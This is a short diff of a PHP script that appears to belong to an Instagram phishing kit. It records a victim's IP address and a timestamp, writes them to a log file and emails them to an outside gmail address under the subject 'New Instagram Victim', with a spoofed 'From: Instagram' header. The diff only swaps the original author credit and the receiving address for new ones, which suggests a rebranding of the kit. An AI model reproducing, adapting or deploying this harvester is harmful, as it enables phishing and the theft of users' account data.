@@ -5,7 +5,7 @@
 #██║  ██║██╔══╝  ██╔══╝  ██╔═══╝  ╚═══██╗
 #██████╔╝███████╗███████╗██║     ██████╔╝
 #╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ 
-#         By Manisso & IcoDz    
+#         By brad yalo  
                                                                                                                    
 $date = gmdate ("d-n-Y");
 $time = gmdate ("H:i:s");
@@ -18,7 +18,7 @@ $message .= "----------\n";
 $message .= "IP: ".$ip."\n";
 $message .= "Log : $time / $date \n";
 $rnessage = "$message\n";
-$send= "manissospam@gmail.com";
+$send= "radrex460@gmail.com";
 $subject = "New Instagram Victim | $ip";
 $headers = "From: Instagram";
 $file = fopen("logs.txt","ab");
